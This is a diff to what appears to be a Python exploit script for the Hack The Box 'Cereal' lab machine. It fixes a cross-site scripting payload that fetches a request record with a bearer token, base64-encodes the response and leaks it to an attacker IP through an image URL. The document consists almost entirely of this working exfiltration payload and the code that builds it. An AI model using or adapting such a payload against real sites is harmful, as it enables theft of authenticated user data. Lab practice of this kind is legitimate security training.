@@ -54,7 +54,7 @@ def xss_cereal(ip, base_url, base_headers, token, target_id):
     
     print("\n=== POSTING XSS CEREAL ===\n")
     
-    js_string = 'var myHeaders = new Headers(); myHeaders.append(\'Authorization\', \'Bearer ' + token + '\');var myInit = {method: \'GET\', headers: myHeaders}; fetch("requests/' + target_id + '", myInit).then(function(response) {var resp = btoa(response.text());const image = document.createElement("img");image.src = "http://' + ip + '/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);});'
+    js_string = 'var myHeaders = new Headers(); myHeaders.append(\'Authorization\', \'Bearer ' + token + '\');var myInit = {method: \'GET\', headers: myHeaders}; fetch("https://cereal.htb/requests/' + target_id + '", myInit).then(response => response.text()).then((body) => {var resp = btoa(body);const image = document.createElement("img");image.src = "http://' + ip + '/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);});'
     
     print("Javascript to be injected: " + js_string + "\n")
     
